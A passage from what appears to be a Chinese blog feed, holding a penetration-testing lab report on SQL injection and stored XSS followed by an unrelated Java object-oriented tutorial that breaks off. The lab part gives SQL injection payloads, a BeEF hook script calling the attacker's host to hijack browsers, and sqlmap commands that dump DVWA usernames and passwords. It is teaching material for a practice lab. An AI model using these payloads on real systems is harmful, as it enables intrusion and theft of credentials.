何时使用SQL注入攻击</p><p>当Web应用向后端的数据库提交输入时，就可能遭到SQL注入攻击。可以将SQL命令人为的输入到URL、表格域，或者其他一些动态生成的SQL查询语句的输入参数中，完成上述攻击。因为大多数的Web应用程序都依赖于数据库的海量存储和相互间的逻辑关系（用户权限许可，设置等），所以，每次的查询中都会存在大量的参数。</p><p>4、MySQL简介</p><p>SQL是结构化查询语言的简称，它是全球通用的标准数据库查询语言，主要用于关系型数据的操作和管理，如增加记录，删除记录，更改记录，查询记录等，常用命令知识如表所示。</p><table><thead><tr><th>命令短语</th><th>功能</th><th>例句</th></tr></thead><tbody><tr><td>select</td><td>用于查询记录和赋值</td><td>select i,j,k from A (i,j,k是表A中仅有的列名)  select i&#x3D;’1’ (将i赋值为字符1)  select* from A (含义同第一个例句)</td></tr><tr><td>update</td><td>用于修改记录</td><td>update A set i&#x3D;2   where i&#x3D;1 (修改A表中i&#x3D;1的i值为2)</td></tr><tr><td>insert</td><td>用于添加记录</td><td>insert into A values(1, ‘2’,3) (向A表中插入一条记录(i,j,k)对应为(1, ‘2’,3))</td></tr><tr><td>delete</td><td>用于删除记录</td><td>delete A where i&#x3D;2 (删除A标中i&#x3D;2的所有表项)</td></tr><tr><td>from</td><td>用于指定操作的对象名（表，视图，数据库等的名称）</td><td>见 select</td></tr><tr><td>where</td><td>用于指定查询条件</td><td>select *from A,B where A.name&#x3D;B.name and A.id&#x3D;B.id</td></tr><tr><td>and</td><td>逻辑与</td><td>1&#x3D;1 and 2&lt;&#x3D;2</td></tr><tr><td>or</td><td>逻辑或</td><td>1&#x3D;1 or 1&gt;2</td></tr><tr><td>not</td><td>逻辑非</td><td>not 1&gt;1</td></tr><tr><td>&#x3D;</td><td>相等关系或赋值</td><td>见and、or、not</td></tr><tr><td>&gt;,&gt;&#x3D;,&lt;,&lt;&#x3D;</td><td>关系运算符</td><td>与相等关系(‘&#x3D;’)的用法一致。</td></tr><tr><td>单引号(“’”)</td><td>用于指示字符串型数据</td><td>见select</td></tr><tr><td>逗号</td><td>分割相同的项</td><td>见select</td></tr><tr><td>*</td><td>通配符所有</td><td>见select</td></tr><tr><td>–</td><td>行注释</td><td>–这里的语句将不被执行!</td></tr><tr><td>&#x2F;* *&#x2F;</td><td>块注释</td><td>&#x2F;* 这里的语句将不被执行! *&#x2F;</td></tr></tbody></table><p>5、实施SQL注入攻击</p><p>5.1． 攻击一</p><p>任何输入，不论是Web页面中的表格域还是一条SQL查询语句中API的参数，都有可能遭受SQL注入的攻击。如果没有采取适当的防范措施，那么攻击只有可能在对数据库的设计和查询操作的结构了解不够充分时才有可能失败。</p><p>从SQL命令（更多的SQL命令见原理三）SELECT切入比较好。SELECT的使用格式如下：</p><p>SELECT datacolumn,otherdatacolumn FROM databasetable WHERE conditionismet</p><p>SQL在Web应用程序中的常见用途就是查询产品信息。应用程序通过CGI参数建立链接，在随后的查询中被引用。这些链接看起来通常像如下的样子：</p><p><a href="http://www.flowershop.com/store/itemdetail.asp?id=896">http://www.flowershop.com/store/itemdetail.asp?id=896</a></p><p>应用程序需要知道用户希望得到哪种产品的信息，所以浏览器会发送一个标识符，通常称为id。随后，应用程序动态的将其包含到SQL查询请求中，以便于从数据库中找到正确的行。查询语句通常的形式如下：</p><p>SELECT name,picture,description,price FROM products WHERE id&#x3D;896</p><p>但是，用户可以在浏览器中轻易的修改信息。设想一下，作为某个Web站点的合法用户，在登入这个站点的时候输入了账号ID和密码。下面的SQL查询语句将返回合法用户的信息：</p><p>SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘account’ AND password &#x3D; ‘passwd’</p><p>上面的SQL查询语句中唯一受用户控制的部分就是在单引号中的字符串。这些字符串就是用户在Web表格中输入的。Web应用程序自动生成了查询语句中的剩余部分。</p><p>常理来讲，其他用户在查看此账号信息时，他需要同时知道此账号ID和密码，但通过SQL输入的攻击者可以绕过全部的检查。</p><p>比如，当攻击者知道系统中存在一个叫做Tom的用户时，他会在SQL请求中使用注释符（双虚线–），然后将下面的内容输入到用户账号的表格域中。</p><p>Tom’–</p><p>这将会动态地生成如下的SQL查询语句：</p><p>SELECT accountdata FROM accountinfo WHERE accountid&#x3D;’Tom’–’ AND password&#x3D;’passwd’</p><p>由于“–”符号表示注释，随后的内容都被忽略，那么实际的语句就是：</p><p>SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘Tom’</p><p>没有输入Tom的密码，却从数据库中查到了Tom用户的全部信息！注意这里所使用的语法，作为用户，可以在用户名之后使用单引号。这个单引号也是SQL查询请求的一部分，这就意味着，可以改变提交到数据库的查询语句结构。</p><p>在上面的案例中，查询操作本来应该在确保用户名和密码都正确的情况下才能进行的，而输入的注释符将一个查询条件移除了，这严重的危及到了查询操作的安全性。允许用户通过这种方式修改Web应用中的代码，是非常危险的。</p><p>5.2 攻击二</p><p>一般的应用程序对数据库进行的操作都是通过SQL语句进行，如查询一个表(A)中的一个num&#x3D;8的用户的所有信息，我们通过下面的语句来进行:</p><p>select* from A where num&#x3D;8</p><p>对应页面地址可能有<a href="http://127.0.0.1/list.jsp?num=8%E3%80%82">http://127.0.0.1/list.jsp?num=8。</a></p><p>一个复合条件的查询:</p><p>select* from A where id&#x3D;8 and name&#x3D;’k’</p><p>对应页面地址可能有<a href="http://127.0.0.1/aaa.jsp?id=8&name=k%E3%80%82">http://127.0.0.1/aaa.jsp?id=8&amp;name=k。</a></p><p>通常数据库应用程序中where子句后面的条件部分都是在程序中按需要动态创建的，如下面使用的方法:</p><p>String N&#x3D;request.getParameter(“id”); &#x2F;&#x2F;获得请求参数id的字符串值</p><p>String K&#x3D;request.getParameter(“name”);&#x2F;&#x2F;获得请求参数name的字符串值</p><p>String str&#x3D;”select* from A where id&#x3D;”+N+” and name&#x3D;&#39;“+K+”&#39;“;&#x2F;&#x2F;执行数据库操作</p><p>当N,K从前台获得的数据中存在像“’”,“and 1&#x3D;1”,“or 1&#x3D;1”,“–”就会出现具有特殊意义的SQL语句，当上面<a href="http://127.0.0.1/aaa.jsp?id=8&name=k%E4%B8%AD%E7%9A%84%E2%80%9Cid=8">http://127.0.0.1/aaa.jsp?id=8&amp;name=k中的“id=8</a> –”时，在页面地址中可能会有如下的表示：</p><p>http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?n&#x3D;8 –</p><p>上面的str变成了：</p><p>select* from A where id&#x3D;8 – and name&#x3D;’k’</p><p>熟悉SQL Server 的人一定明白上面语句的意义，很明显，–后面的条件and name&#x3D;’k’不会被执行，因为它被“–”注释掉了。</p><p>当上面的K&#x3D;”XXX&#39;or 1&#x3D;1”时（“&#39;”是“’”在字符串中的转义字符），在页面地址中会有如下的表示：</p><p>http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?name&#x3D;XXX’or 1&#x3D;1</p><p>同样上面的语句变成了：</p><p>select *from A where id&#x3D;8 and name&#x3D;’XXX’ or 1&#x3D;1.</p><p>这条语句会导致查询到所有用户的信息而不需要使用正确的id和name属性，虽然结果不会在页面上直接得到，但可以通过数据库的一些辅助函数间接猜解得到，下面猜解的例子能够说明SQL注入漏洞的危害性：</p><p>在SQL Server 2000中有user变量，用于存储当前登录的用户名，因此可以利用猜解它来获得当前数据库用户名，从而确定当前数据库的操作权限是否为最高用户权限，在一个可以注入的页面请求地址后面加上下面的语句，通过修改数值范围，截取字符的位置，并重复尝试，就可以猜解出当前数据库连接的用户名：</p><p>and (SubString(user,1,1)&gt; 65 and SubString(user,1,1)&lt;90) </p><p>如果正常返回，则说明当前数据库操作用户帐户名的前一个字符在A~Z的范围内，逐步缩小猜解范围，就可以确定猜解内容。SubString（）是SQL Server 2000 数据库中提供的系统函数，用于获取字符字符串的子串。65，和90分别是字母A和Z的ascii码。</p><p>再有，在数据库中查找用户表（需要一定的数据库操作权限），可以使用下面的复合语句：</p><p>and (select count(*) from sysobjects where xtype&#x3D;’u’)&gt;n</p><p>n取1，2，……,通过上面形式的语句可以判断数据库中有多少用户表。</p><p>可以通过and(substring((select top 1 name from sysobjects where xtype &#x3D;’u’),1,1)&#x3D;字符)的形式逐步猜解出表名。</p><p>利用构建的SQL注入短语，可以查询出数据库中的大部分信息，只要构建的短语能够欺骗被注入程序按你的意图执行，并能够正确分析程序返回的现象，注入攻击者就可以控制整个系统。</p><p>基于网页地址的SQL注入只是利用了页面地址携带参数这一性质，来构建特殊sql语句以实现对Web应用程序的恶意操作（查询，修改，添加等）。事实上SQL注入不一定要只针对浏览器地址栏中的url。任何一个数据库应用程序对前台传入数据的处理不当都会产生SQL注入漏洞，如一个网页表单的输入项，应用程序中文本框输的入信息等。</p><p>6、防范SQL注入方法汇总</p><p>Web开发人员认为SQL查询请求是可以信赖的操作，但事实却是恰恰相反的，他们没有考虑到用户可以控制这些查询请求的参数，并且可以在其中输入符合语法的SQL命令。</p><p>解决SQL注入问题的方法再次归于对特殊字符的过滤，包括URL、表格域以及用户可以控制的任何输入数据。与SQL语法相关的特殊字符以及保留字应当在查询请求提交到数据库之前进行过滤或者被去除（例如跟在反斜号后面的单引号）。过滤操作最好在服务器端进行。将过滤操作的代码插入到客户机端执行的HTML中，实在是不明智的，因为攻击者可以修改验证程序。防止破坏的唯一途径就是在服务器端执行过滤操作。避免这种攻击更加可靠的方式就是使用存储过程。具体可以通过以下若干方法来防范SQL注入攻击。</p><p>（1） 对前台传入参数按的数据类型，进行严格匹配（如查看描述数据类型的变量字符串中，是否存在字母）。</p><p>（2） 对于单一变量（如上面的K，N）如果有必要，过滤或替换掉输入数据中的空格。</p><p>（3） 将一个单引号（“’”），替换成两个连续的单引号（“’’”）。</p><p>（4） 限制输入数据的有效字符种类，排除对数据库操作有特殊意义的字符（如“–”）。</p><p>（5） 限制表单或查询字符串输入的长度。</p><p>（6） 用存储过程来执行所有的查询。</p><p>（7） 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。</p><p>（8） 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。</p><p>总而言之，就是要尽可能地限制用户可以存取的数据总数。另外，对用户要按“最小特权”安全原则分配权限，即使发生了SQL注入攻击，结果也被限制在那些可以被正常访问到的数据中。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="XSS部分："><a href="#XSS部分：" class="headerlink" title="XSS部分："></a>XSS部分：</h3><p>利用Beef劫持被攻击者客户端浏览器。</p><p>实验环境搭建。</p><p>角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）</p><p>攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；</p><p>被攻击者：访问留言簿网站，浏览器被劫持。</p><h4 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。</h4><h4 id="2、-Kali使用beef生成恶意代码，截图。"><a href="#2、-Kali使用beef生成恶意代码，截图。" class="headerlink" title="2、 Kali使用beef生成恶意代码，截图。"></a>2、 Kali使用beef生成恶意代码，截图。</h4><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/XSS2.png"></p><h4 id="3、访问http-留言簿网站"><a href="#3、访问http-留言簿网站" class="headerlink" title="3、访问http:&#x2F;&#x2F;留言簿网站"></a>3、访问http:&#x2F;&#x2F;留言簿网站</h4><p>&#x2F;message.asp;将以下恶意代码写入网站留言板，</p><script src="http://Kali的IP地址:3000/hook.js"></script>，截图。<p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/XSS3.png"></p><h4 id="4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"><a href="#4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。" class="headerlink" title="4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"></a>4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</h4><h4 id="5、回答问题：实验中XSS攻击属于哪种类型？"><a href="#5、回答问题：实验中XSS攻击属于哪种类型？" class="headerlink" title="5、回答问题：实验中XSS攻击属于哪种类型？"></a>5、回答问题：实验中XSS攻击属于哪种类型？</h4><p>回答：存储型</p><h3 id="SQL注入部分："><a href="#SQL注入部分：" class="headerlink" title="SQL注入部分："></a>SQL注入部分：</h3><p>DVWA+SQLmap+Mysql注入实战**</p><p>实验环境搭建。启动Metasploitable2虚拟机。</p><p>1、注入点发现。首先肯定是要判断是否有注入漏洞。</p><p>在输入框输入1，返回</p><p>ID: 1</p><p>First name: admin</p><p>Surname: admin</p><p>返回正常；</p><p>再次输入1’，报错，返回</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p><p>此时可以断定有SQL注入漏洞，</p><p><a href="http://ip地址/DVWA-master/vulnerabilities/sqli/?id=22&Submit=Submit#">http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</a></p><p>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</p><h4 id="2、枚举当前使用的数据库名称和用户名。"><a href="#2、枚举当前使用的数据库名称和用户名。" class="headerlink" title="2、枚举当前使用的数据库名称和用户名。"></a>2、枚举当前使用的数据库名称和用户名。</h4><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --current-db --current-user                               </span><br></pre></td></tr></table></figure><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL1.png"></p><h4 id="3、枚举数据库用户名和密码"><a href="#3、枚举数据库用户名和密码" class="headerlink" title="3、枚举数据库用户名和密码"></a>3、枚举数据库用户名和密码</h4><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --users --password   </span><br></pre></td></tr></table></figure><p>​                                   </p><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL2.png"></p><h4 id="4、枚举数据库"><a href="#4、枚举数据库" class="headerlink" title="4、枚举数据库"></a>4、枚举数据库</h4><p>–dbs：枚举当前数据库</p><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --dbs                                </span><br></pre></td></tr></table></figure><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL3.png"></p><h4 id="5、枚举数据库和指定数据库的数据表"><a href="#5、枚举数据库和指定数据库的数据表" class="headerlink" title="5、枚举数据库和指定数据库的数据表"></a>5、枚举数据库和指定数据库的数据表</h4><p> -D 数据库名：指定数据库</p><p>–tables：枚举指定数据库的所有表</p><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa --tables</span><br></pre></td></tr></table></figure><p>​                                      </p><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL4.png"></p><h4 id="6、获取指定数据库和表中所有列的信息"><a href="#6、获取指定数据库和表中所有列的信息" class="headerlink" title="6、获取指定数据库和表中所有列的信息"></a>6、获取指定数据库和表中所有列的信息</h4><p>-D：指定的数据库</p><p>-T：指定数据库中的数据表</p><p>–columns：获取列的信息</p><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users --columns  </span><br></pre></td></tr></table></figure><p>​                                    </p><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL5.png"></p><h4 id="7、枚举指定数据表中的所有用户名与密码-并down到本地。"><a href="#7、枚举指定数据表中的所有用户名与密码-并down到本地。" class="headerlink" title="7、枚举指定数据表中的所有用户名与密码,并down到本地。"></a>7、枚举指定数据表中的所有用户名与密码,并down到本地。</h4><p>-C：枚举数据表中的列</p><p>–dump：存储数据表项</p><p>你输入的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;  --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></figure><p>​                                     </p><p>Sqlmap输出截图。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL6.png"></p><p>查看down到本地的用户名与密码，截图。（提示带.的文件夹为隐藏，在图形命令下，用文件浏览器打开文件夹，按下ctrl+h组合键可显示隐藏文件合文件夹，再按一次取消显示。）</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/SQL7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象编程</title>
      <link href="/2023/12/23/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/12/23/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Java面向对象编程"><a href="#Java面向对象编程" class="headerlink" title="Java面向对象编程"></a>Java面向对象编程</h1><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java类及类的成员：属性、方法、构造器、代码块、内部类</span></span><br><span class="line"><span class="comment">//面向对象的特征：封装、继承、多态、抽象</span></span><br><span class="line"><span class="comment">//其他关键字的使用：this、super、package、import、static、final、interface、abstract等</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">phone</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="type">double</span> price;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打电话&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(String[] message)</span>&#123;</span><br><span class="line">        System.out.println(message[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playGame</span><span class="params">(String game)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;玩&quot;</span>+game);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        phone p1=<span class="keyword">new</span> <span class="title class_">phone</span>();</span><br><span class="line">        <span class="comment">//声明属性</span></span><br><span class="line">        p1.name=<span class="string">&quot;redmi&quot;</span>;</span><br><span class="line">        p1.price=<span class="number">1999</span>;</span><br><span class="line">        <span class="comment">//声明方法</span></span><br><span class="line">        p1.call();</span><br><span class="line">        p1.playGame(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        String[] message=&#123;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>&#125;;</span><br><span class="line">        p1.sendMessage(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出：</span></span><br><span class="line"><span class="comment">打电话</span></span><br><span class="line"><span class="comment">玩4</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建对象数组</span></span><br><span class="line">        phone p1[]=<span class="keyword">new</span> <span class="title class_">phone</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> a=<span class="number">0</span>;a&lt;p1.length;a++)</span><br><span class="line">        &#123;</span><br><span class="line">            p1[a]=<span class="keyword">new</span> <span class="title class_">phone</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//声明属性</span></span><br><span class="line">        p1[<span class="number">0</span>].name=<span class="string">&quot;redmi&quot;</span>;</span><br><span class="line">        p1[<span class="number">0</span>].price=<span class="number">1999</span>;</span><br><span class="line">        p1[<span class="number">1</span>].name=<span class="string">&quot;onplus&quot;</span>;</span><br><span class="line">        p1[<span class="number">1</span>].price=<span class="number">2499</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">0</span>;a&lt; p1.length;a++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;品牌：&quot;</span>+p1[a].name+<span class="string">&quot;,价格：&quot;</span>+p1[a].price);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在同一个类中，允许存在一个以上的同名方法，只要它们的参数列表不同即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playGame</span><span class="params">(String game)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;玩&quot;</span>+game);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playGame</span><span class="params">(String games,<span class="type">int</span> a)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;玩了&quot;</span>+games+a+<span class="string">&quot;小时&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="可变个数形参的方法"><a href="#可变个数形参的方法" class="headerlink" title="可变个数形参的方法"></a>可变个数形参的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>...num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">0</span>;a&lt;num.length;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum+num[a];</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methoda</span><span class="params">()</span>&#123;</span><br><span class="line">       methoda();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td 